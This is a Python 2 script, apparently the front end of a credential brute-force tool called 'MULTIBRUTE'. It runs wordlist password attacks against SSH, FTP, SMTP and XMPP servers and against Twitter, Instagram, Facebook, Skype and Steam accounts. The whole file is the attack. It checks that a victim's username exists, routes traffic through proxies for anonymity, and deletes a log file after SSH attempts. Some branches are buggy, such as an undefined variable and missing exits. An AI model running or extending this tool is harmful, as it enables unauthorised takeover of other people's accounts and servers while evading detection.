from sys import *

path.append('modules/')
from mainLib import *
from facebookLib import *
from instagramLib import *
from twitterLib import *
from steamLib import *
from header import *


def get_args():

    parser = argparse.ArgumentParser(description='Server-side bruteforce module written in Python')
    required = parser.add_argument_group('required arguments')
    required.add_argument('-service', '--service', dest='service', help="Provide a service being attacked. Several protocols and services are supported")
    required.add_argument('-user', '--username', dest='username', help='Provide a valid username for service/protocol being executed')
    required.add_argument('-wlist', '--wordlist', dest='password', help='Provide a wordlist or directory to a wordlist')
    parser.add_argument('-address', '--address', dest='address', help='Provide host address for specified service. Required for certain protocols')
    parser.add_argument('-port', '--port', type=int, dest='port', help='Provide port for host address for specified service. If not specified, will be automatically set')
    parser.add_argument('-delay', '--delay', type=int, dest='delay', help='Provide the number of seconds the program delays as each password is tried')
    parser.add_argument('--proxy', dest='proxy', help="Providing a proxy for anonymization and avoiding time-outs")

    args = parser.parse_args()

    man_options = ['username', 'password']
    for m in man_options:
        if not args.__dict__[m]:
            print R + "You have to specify a username AND a wordlist! [!]" + W
            exit()

    service = args.service
    username = args.username
    wordlist = args.password
    address = args.address
    port = args.port
    delay = args.delay
    proxy = args.proxy

    if delay is None:
        delay = 1


    return service, username, wordlist, address, port, delay, proxy

def main():

    service, username, wordlist, address, port, delay, proxy = get_args()

    print (B +"MULTIBRUTE /// WRITEN IN PYTHON /// BY BLOODEAGLE")

    print (G + ": %s " % username) + W
    sleep(0.5)
    print (G + ": %s " % wordlist) + W
    sleep(0.5)
    if os.path.exists(wordlist) == False:
        print R + "enter a valid wordlist" + W
        exit()
    print (G + ": %s "  % service)
    if proxy is not None:
        print (C + "Proxy file: %s " % proxy) + W
        print O + "Checking if proxies are active" + W
        print ""
        proxyServer(proxy)
        print ""
    sleep(0.5)

    if service == 'ssh':
        if address is None:
            print R + "[!] You need to provide a SSH address for cracking! [!]" + W
            exit()
        print C + "[*] Address: %s" % address + W
        sleep(0.5)

        if port is None:
            print O + "[?] Port not set. Automatically set to 22 for you [?]" + W
            port = 22

        print C + "[*] Port: %s "  % port + W
        sleep(1)
        print P + "[*] Starting dictionary attack! [*]" + W
        print "Using %s seconds of delay. Default is 1 second" % delay

        sshBruteforce(address, username, wordlist, port, delay)
        call(["rm", "filename.log"])

    elif service == 'ftp':
        if address is None:
            print R + "[!] You need to provide a FTP address for cracking! [!]" + W
        print C + "[*] Address: %s" % address + W
        sleep(0.5)
        if port is None:
            print O + "[?] Port not set. Automatically set to 21 for you [?]" + W
            port = 21
        print C + "[*] Port: %s "  % port + W
        sleep(1)
        print P + "[*] Starting dictionary attack! [*]" + W
        print "Using %s seconds of delay. Default is 1 second" % delay
        ftpBruteforce(address, username, wordlist, delay, port)

    elif service == 'smtp':
        if address is None:
            print R + "You need to provide an SMTP server address for cracking! [!]" + W
            print O + "| Gmail: smtp.gmail.com |\n| Outlook: smtp.live.com |\n| Yahoo Mail: smtp.mail.yahoo.com |\n| AOL: smtp.aol.com | " + W
        print C + "SMTP server: %s" % address + W
        sleep(0.5)
        if port is None:
            print O + "Port not set. Automatically set to 587 for you "
            print O + "NOTE: SMTP has several ports for usage, including 25, 465, 587" + W
            port = 587
        print C + "[*] Port: %s "  % port + W
        sleep(1)
        print P + "[*] Starting dictionary attack! [*]" + W
        print "Using %s seconds of delay. Default is 1 second" % delay
        smtpBruteforce(address, username, wordlist, delay, port)

    elif service == 'xmpp':
        if address is None:
            print R + "NOTE: You need to include a server address for cracking XMPP" + W
            print O + "| For example: cypherpunks.it | inbox.im | creep.im |" + W
        print C + "[*] XMPP server: %s" % address + W
        sleep(0.5)
        if port is None:
            print O + "[?] Port not set. Automatically set to 5222 for you [?]"
            port = 5222
        print C + "Port: %s "  % port + W
        sleep(1)
        print P + "Starting dictionary attack! " + W
        print "Using %s seconds of delay. Default is 1 second" % delay
        xmppBruteforce(address, port, username, wordlist, delay)

    elif service == 'twitter':
        if address or port:
            print R + "NOTE: You don't need to provide an address OR port for Twitter (LOL)" + W
            exit()
        print P + "Checking if username exists..." + W
        if twitUserCheck(username) == 1:
            print R + "The username was not found! Exiting..." + W
            exit()
        print G + "Username found! Continuing..." + W
        sleep(1)
        twitterBruteforce(username, wordlist, delay)

    elif service == 'instagram':
        if address or port:
            print R + "You don't need to provide an address OR port for Instagram" + W
            exit()
        print P + "SCRIPT IS RUNNING AND DOING ITS THING SO WAIT" + W
        if instUserCheck(username) == 1:
            print R + "wong username" + W
            exit()
        print G + "valid username" + W
        sleep(1)
        print G + "Starting attack now go wait like 12 hours" + W
        print "Using %s seconds of delay" % delay
        instagramBruteforce(username, wordlist, delay)

    elif service == 'facebook':
        if address or port:
            print R + "NOTE: You don't need to provide an address OR port for Facebook (LOL) [!]" + w
            exit()
        print P + "Checking if username exists..." + W
        if facebookCheck(username) == 1:
            print R + "The username was not found! Exiting..." + W
            exit()
        print G + "Username found! Continuing..." + W
        sleep(1)
        print P + "Starting bruteforce! " + W
        print "Using %s seconds of delay. Default is 1 second" % delay
        facebookBruteforce(username, wordlist, delay)

    elif service == 'skype':
        if address or port:
            print R + "NOTE: You don't need to provide an address OR port for Skype (LOL) [!]" + W
        print P + "starting bruteforce! " + W
        print "Using %s seconds of delay. Default is 1 second" % delay
        skypeBruteforce(username, wordlist, delay)

    elif service == 'steam':
        print P + " Starting bruteforce! " + W
        print "started..."
        print "Using %s seconds of delay. Default is 1 second" % delay
        steamBruteforce(username, wordlist, delay)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print R + "\n[!] Keyboard Interrupt detected! Killing program... [!]" + W
        sys.exit(1)
